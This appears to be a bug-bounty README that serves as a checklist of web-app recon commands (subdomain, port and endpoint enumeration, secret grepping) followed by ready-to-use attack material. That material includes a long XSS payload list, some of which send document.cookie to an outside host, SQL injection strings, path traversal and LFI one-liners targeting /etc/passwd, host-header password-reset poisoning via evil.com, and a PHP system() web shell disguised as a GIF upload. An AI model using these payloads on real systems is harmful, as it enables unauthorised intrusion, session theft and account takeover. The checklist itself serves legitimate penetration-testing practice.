# Web-Application-Test
Checklist for Webapplication Recon

###  Automate Recon

```bash
./reconftw -d target.com -r 
```
```bash
python3 oneforall.py --target target.com run
```

### Wordpress Scanner

```bash
wpscan --url http://192.168.145.133/wordpress -e vt,tt,u,ap
```
###  Subdomain Enumeration.

```bash
subfinder -d target.com | tee -a subfinder.txt
subfinder -dL subfinder.txt | tee -a subfinders.txt
```

```bash
subfinder -d target.com -silent -o subs.txt | httpx -title -content-length -status-code -silent
```
findomain -t target.com  | tee -a  findomain.txt
```
```bash
ffuf -u https://target.com -H "Host:FUZZ.target.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 

```
```bash
 assetfinder --subs-only target.com | tee -a assetfinder.txt
```
```bash
github-subdomains -d example.com -raw -o githubsubdomains.txt
```

```bash
python3 knockpy.py domain.com | tee -a knockpy.txt 
```
```bash
amass enum -v -src -ip -brute -min-for-recursive 2 -d target.com | tee -a amass.txt
```
### Subdomain sorting

```bash
sort subfinders.txt findomain.txt assetfinder.txt githubsubdomains.txt amass.txt knockpy.txt > target_subdomains.txt
```
```bash
cat target_subdomains.txt | httprobe | tee -a subdomains.txt 
```



###  Subdomain Takeover

```bash
cat subdomains.txt | nuclei -t /root/nuclei-template/takeovers
```
```bash
subzy -target /home/path/to/subdomains.txt
```


### ASN Enumerations

```bash
cat subdomains.txt | httpx -asn | tee -a asn.txt
```
- https://github.com/nitefood/asn
```bash
asn -d domainname.com
```
```bash
asn -d IP
```
#### Shodan Query : https://mr-koanti.github.io/shodan
### ASN-Shodan Enumeration

```bash
asn:ASxxxx
```
### Shodan-Facet Analysis
```bash
asn:AS123XX http.title
```

### httpx 
- Status Code
```bash
cat subdomains.txt | httpx -mc 200,204,301,307,401,405,400,302 -sc
```
- IP Grabbing
```bash
cat subdomains.txt| httpx -probe -ip -cdn
```
- Probbing except 404 response code
```bash
cat subdomains.txt | httpx -sc -fc 404
```
- Grabbing Specific Path
```bash
cat subdomains.txt | httpx -probe -sc -path "/robots.txt"
```


### Javascript Enumeration. Refer to https://github.com/B-and-w-sec/shell-scripts

```bash
cat subdomains.txt | subjs | tee -a javascript.txt
```
```bash
while read url; do python3 /home/sumedh/tools/SecretFinder/SecretFinder.py -i $url -o cli ; done < "$1"
```

```bash
while read url ; do echo e "\n\n --------- URL: " $url "-----------" ;  python3 /home/sumedh/tools/LinkFinder/linkfinder.py -i $url -o cli; done < "$1"
```


```bash
cat subdomains.txt | httpx -sc -td -server -ip -cname -json -o httpx.json -mc 200,204,301,307,401,405,400,302,500 -x POST GET TRACE OPTIONS
```
```bash
cat httpx.json | jq
```
```bash
cat domains.txt | katana | grep js | httpx -mc 200 | tee js.txt
```
```bash
nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_bugs.txt
```
```bash
file="js.txt"

# Loop through each line in the file
while IFS= read -r link
do
    # Download the JavaScript file using wget
    wget "$link"
done < "$file"

AGAIN, 

grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp" *.js
```
### Google dork : https://pentest-tools.com/information-gathering/google-hacking OR http://seckrd.com/google-hacking

```bash
• site:tesla.com -www -shop -share -ir -mfa
• site:pastebin.com "tesla.com"
• site:jsfiddle.net "tesla.com"
• site:codebeautify.org "tesla.com"
• site:codepen.io "tesla.com"
• site:tesla.com ext:php inurl:?
• site:openbugbounty.org inurl:reports intext:"yahoo.com"
• (site:tesla.com | site:teslamotors.com) & "choose file"
```
### Github dork 

```bash
• "site.com" API_key
• "site.com" secret_key
• "site.com" email
• "site.com" password
• "site.com" login
• "site.com" admin
• org:org_name "password"
• org:org_name "secret"
• user:username "password"
• user:username "secret"
```

### Port-Scanning

```bash
naabu -list subdomains.txt | tee -a naabu_port_number.txt
```
```bash
naabu -l subdomains.txt -rate 3000 -retries 1 -warm-up-time 0 -c 50 -top-ports 65535 - silent
```
```bash
cat subdoamins.txt | aquatone --ports xlarge
```
```bash
cat subdomains.txt  | naabu -silent 
```
```bash
echo ASxxxx | naabu 
```

### Endpoint Extraction 

```bash
cat subdomains.txt | katana | tee -a katana.txt
```
```bash
cat subdomains.txt | gauplus | tee -a gauplus.txt
```
```bash
cat subdomains.txt | waybackurl | tee -a wayback.txt
```
```bash
cat subdomains.txt | hakrawler | tee  -a hakrawler.txt
```
```bash
cat subdomains.txt | gau --blacklist png,jpg,jpeg,img,svg,mp3,mp4,eot,woff1,woff2,css | tee -a extension_extractor.txt
```
### Sorting Endpoints
```bash
sort katana.txt gauplus.txt wayback.txt hakrawler.txt extension_extractor.txt > endpoints.txt
```

### Content Discovery
- Make sure you change you wordlists. https://github.com/SumedhDawadi/wordlists
```bash
dirsearch -u https://domains.com -r -e php,html,js,txt,.zip.jsp,jspx,.bak
```

```bash
gobuster dir -u http://target.com -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
```
```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/ -mc 200,204,301,307,401,405,400,302
```
- Change extensions 
```bash
ffuf -c -u https://target.com/FUZZ.html -w /usr/share/wordlists/bughunting/sdasdasdasd.txt -mc 200,204,301,307,401,405,400,302
```
- Bruteforce path  refering to nmap or naabu result for specific path
```bash
dirsearch -u http://target.com:8858/ -r  -w #use different wordlists
```

### GF Pattern
- Use GF template one by one
```bash
cat endpoints.txt | gf -list
```

### Nuclei 
- Use Cent as a custom Nuclei Templates. https://github.com/xm1k3/cent
```bash
cat subdoamins.txt | nuclei 
```
```bash
cat endpoints.txt | nuclei
```
```bash
nuclei -u https://targets.com:8858 -t /root/nuclei-template/
```
# Use Burpsuite for further exploitation.


#### Random Payload to use: 
```bash
• "><xss/id="1"/tabindex="1"/style="font-size:%20100px"/autofocus/onfocusin="confirm%601%60">
• "><xss/id="1"/tabindex="1"/style="font-size:%20100px"/autofocus/onfocusin="window.location.href='https://example.com?cookie='%2bdocument.cookie">
• "><xss/id="1"/tabindex="1"/onfocusin="window.location.href='https://example.com?cookie='%2bdocument.cookie">
• <iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>  
• <<scrip<scriptT>alert(1);
• "><img src/onerror=prompt(document.cookie)>
• "><img src=x onerror=alert(document.domain)> 
• «sVg
• OnPointerEnter= "location= lavas + cript:ale + 'rt%2 + '81%2° +9%//</div">
%7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
• "12345-abc-1-23456<scr<script>ipt>alert(document.cookie)<%2Fscr<script>ipt>.img"
• <svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
• <script src="data:,alert(1)%250A-->
• <script>alert(1)%0d%0a-->%09</script
• <x>%00%00%00%00%00%00%00<script>alert(1)</script>
• <script>location.href;'javascript:alert%281%29'</script>
• jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
\');confirm(1);//
• <img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
• <meter onmouseover="alert(1)"
• '">><div><meter onmouseover="alert(1)"</div>"
• <marquee loop=1 width=0 onfinish=alert(1)>
• &#60;script&#62;alert(1)&#60;/script&#62;
• %3Cscript%3Ealert(1)%3C/script%3E
• \\x3cscript\\x3ealert(1)\\x3c/script\\x3e
• \\u003cscript\\u003ealert(1)\\u003c/script\\u003e
• %26#x6c;t;\\x73cript&#62;\\u0061lert(1)%26#x6c;t;/\\x73cript&#62;
• <input type=text value=”A” autofocus onfocus=alert(“XSS”)//”>	
• <a href="javascript:alert(1)">ssss</a>
• +ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-
• +ADw-script+AD4-alert(+ACc-utf-7!+ACc-)+ADw-+AC8-script+AD4-
• +ADw-script+AD4-alert(+ACc-xss+ACc-)+ADw-+AC8-script+AD4-
• <%00script>alert(‘XSS’)<%00/script>
• <%script>alert(‘XSS’)<%/script>
• <IMG SRC="javascript:alert('XSS');">
• <BASE HREF="javascript:alert('XSS');//">
• /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
• <Svg One OneLoad=alert(1)>
• ["');alert('CYBERTIX');//"]@bug.xss 
• <img src="http://burp-collobrator">
• javascript:alert(1) #Use this once you are redirected to another domain
• admin' or '1'='1'--
• X-Forwarded-Host: evil.com
• X-Forwarded-Host: a.\"><script>alert(1)</script>
• X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z 
• <link rel="canonical" href="https://a">a<iframe onload=alert(1)>

```
#### SQL Injection
```bash
• benchmark%281000000000%2Cmd5%281%29%29--
email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
• ' AND extractvalue(rand(),concat(0x3a,(SELECT user()))) #
• 
```
- Bash One liners and More.


### Subdomain Takeover 

```bash
subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```
### XSS 
```bash
echo target.com | gau | while read url; python3 xsstrike.py -u $url --crawl -l 2; done;
```
```bash
waybackurls HOST | tee HOST.txt | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \\033[0;31mVulnerable\\n" || echo "$host \\033[0;32mNot Vulnerable\\n";done
```
```bash
cat subdomains.txt | bhedak "\"><svg/onload=alert(1)>*'/---+{{7*7}}"
```
```bash
gospider -S subdomains.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```
### SQL injection 

```bash
cat subdomains.txt | waybackurls | uro | grep "\?" | httpx -silent > param.txt
```
```bash
sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
```
```bash
cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | httpx -silent -ms "You have an error in your SQL syntax"
```

```bash
sqlmap -u “https://www.site.com/login” — data=”username=a&password=b” — random-agent — tamper=space2comment — level 3 — risk 3 — dbs
```

### Open Redirect 
- Try escalating to SSRF 

```bash
echo "target.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```
### Path Traversal
```bash
httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
```
```bash
cat subdomains.txt | assetfinder -subs-only | httpx -silent -p 80,443,8080,8443,9000 -nc -path ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd" -mr "root:x" | tee -a p1s.txt
```
### Prototype Pollution
```bash
subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```
### Local File Inclusion

```bash
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```


###  40X bypass

```bash
site.com/secret –> HTTP 403 Forbidden
site.com/SECRET –> HTTP 200 OK
site.com/secret/ –> HTTP 200 OK
site.com/secret/. –> HTTP 200 OK
site.com//secret// –> HTTP 200 OK
site.com/./secret/.. –> HTTP 200 OK
site.com/;/secret –> HTTP 200 OK
site.com/.;/secret –> HTTP 200 OK
site.com//;//secret –> HTTP 200 OK
site.com/secret.json –> HTTP 200 OK
```

### Check List 

#### Forgot Password Functionality
1. Parameter pollution
```bash
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com&email=hacker@mail.com
```
2. Host header Injection
```bash
POST /reset HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com


email=victim@mail.com

Using separator in value of the parameter
``` 
3. Using separator in value of the parameter
```bash
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com,hacker@mail.com
```
4. File Upload

- Upload the payload, but start with GIF89a; 
```bash
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system("id") ?>
...

```

## Important Links 
#### notes for Pentesting,hacking techniques and tools for penetration testings, bug bounty, CTFs
```bash
https://exploit-notes.hdks.org/
```
